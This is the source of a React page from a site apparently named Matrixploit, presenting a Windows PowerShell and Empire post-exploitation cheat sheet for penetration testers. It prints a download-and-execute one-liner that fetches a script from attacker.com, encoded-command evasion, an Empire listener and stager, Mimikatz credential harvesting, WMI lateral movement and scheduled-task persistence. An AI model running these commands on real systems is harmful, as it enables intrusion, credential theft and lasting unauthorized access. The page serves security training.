export const metadata = {
  title: 'PowerShell / Empire | Matrixploit',
  description: 'Windows post-exploitation notes and PowerShell snippets for ethical hacking.',
}

export default function PowerShellEmpirePage() {
  return (
    <div className="container mx-auto px-4 py-12">
      <div className="max-w-4xl mx-auto">
        <h1 className="text-4xl font-bold mb-4">PowerShell & Empire</h1>
        <p className="text-text-secondary mb-12 text-lg">
          Notes and snippets for PowerShell usage and post-exploitation frameworks. This content
          focuses on Windows environments and common post-exploitation techniques.
        </p>

        {/* PowerShell Basics */}
        <section className="mb-16">
          <h2 className="text-3xl font-semibold mb-6 text-matrix-green">PowerShell Basics & Snippets</h2>

          <div className="space-y-8">
            <div className="bg-bg-card border border-matrix-green/20 rounded-lg p-6">
              <h3 className="text-xl font-semibold mb-4">Bypass Execution Policy</h3>
              <pre className="code-block">
                <code>powershell.exe -ExecutionPolicy Bypass -File script.ps1</code>
              </pre>
              <p className="text-text-secondary text-sm mt-3">
                Execute PowerShell scripts without restrictions imposed by execution policies.
              </p>
            </div>

            <div className="bg-bg-card border border-matrix-green/20 rounded-lg p-6">
              <h3 className="text-xl font-semibold mb-4">Download and Execute</h3>
              <pre className="code-block">
                <code>{'IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")'}</code>
              </pre>
              <p className="text-text-secondary text-sm mt-3">
                Download and execute a PowerShell script directly from a remote URL in memory.
              </p>
            </div>

            <div className="bg-bg-card border border-matrix-green/20 rounded-lg p-6">
              <h3 className="text-xl font-semibold mb-4">Base64 Encoded Commands</h3>
              <pre className="code-block">
                <code>powershell.exe -EncodedCommand BASE64_STRING</code>
              </pre>
              <p className="text-text-secondary text-sm mt-3">
                Execute Base64-encoded PowerShell commands to evade basic detection mechanisms.
              </p>
            </div>

            <div className="bg-bg-card border border-matrix-green/20 rounded-lg p-6">
              <h3 className="text-xl font-semibold mb-4">Process Enumeration</h3>
              <pre className="code-block">
                <code>Get-Process | Select-Object Name, Id, Path</code>
              </pre>
              <p className="text-text-secondary text-sm mt-3">
                List running processes with their names, IDs, and executable paths.
              </p>
            </div>

            <div className="bg-bg-card border border-matrix-green/20 rounded-lg p-6">
              <h3 className="text-xl font-semibold mb-4">Network Connections</h3>
              <pre className="code-block">
                <code>Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, State</code>
              </pre>
              <p className="text-text-secondary text-sm mt-3">
                Enumerate active TCP network connections on the system.
              </p>
            </div>
          </div>
        </section>

        {/* Empire & Post-Exploitation */}
        <section className="mb-16">
          <h2 className="text-3xl font-semibold mb-6 text-matrix-green">Empire & Post-Exploitation Concepts</h2>

          <div className="space-y-8">
            <div className="bg-bg-card border border-matrix-green/20 rounded-lg p-6">
              <h3 className="text-xl font-semibold mb-4">Listener Setup</h3>
              <pre className="code-block">
                <code>{`uselistener http
set Host http://attacker.com
set Port 80
execute`}</code>
              </pre>
              <p className="text-text-secondary text-sm mt-3">
                Configure an HTTP listener in Empire to receive connections from compromised hosts.
              </p>
            </div>

            <div className="bg-bg-card border border-matrix-green/20 rounded-lg p-6">
              <h3 className="text-xl font-semibold mb-4">Stager Generation</h3>
              <pre className="code-block">
                <code>{`usestager windows/launcher_bat
set Listener http
generate`}</code>
              </pre>
              <p className="text-text-secondary text-sm mt-3">
                Generate a stager payload that will connect back to the Empire listener.
              </p>
            </div>

            <div className="bg-bg-card border border-matrix-green/20 rounded-lg p-6">
              <h3 className="text-xl font-semibold mb-4">Credential Harvesting</h3>
              <pre className="code-block">
                <code>{`usemodule credentials/mimikatz/logonpasswords
execute`}</code>
              </pre>
              <p className="text-text-secondary text-sm mt-3">
                Use Mimikatz through Empire to extract credentials from memory.
              </p>
            </div>

            <div className="bg-bg-card border border-matrix-green/20 rounded-lg p-6">
              <h3 className="text-xl font-semibold mb-4">Lateral Movement</h3>
              <pre className="code-block">
                <code>{`usemodule lateral_movement/invoke_wmi
set ComputerName TARGET_HOST
set Listener http
execute`}</code>
              </pre>
              <p className="text-text-secondary text-sm mt-3">
                Move laterally to other systems using Windows Management Instrumentation.
              </p>
            </div>

            <div className="bg-bg-card border border-matrix-green/20 rounded-lg p-6">
              <h3 className="text-xl font-semibold mb-4">Persistence Mechanisms</h3>
              <pre className="code-block">
                <code>{`usemodule persistence/elevated/schtasks
set DailyTime 09:00
set Listener http
execute`}</code>
              </pre>
              <p className="text-text-secondary text-sm mt-3">
                Establish persistence using scheduled tasks that execute at specified times.
              </p>
            </div>
          </div>
        </section>

        <div className="mt-12 p-6 bg-bg-card border border-matrix-green/20 rounded-lg">
          <h3 className="text-lg font-semibold text-matrix-green mb-2">Note</h3>
          <p className="text-text-secondary text-sm">
            These techniques are for educational purposes and authorized penetration testing only.
            Always ensure you have explicit written permission before testing on any system.
          </p>
        </div>
      </div>
    </div>
  )
}

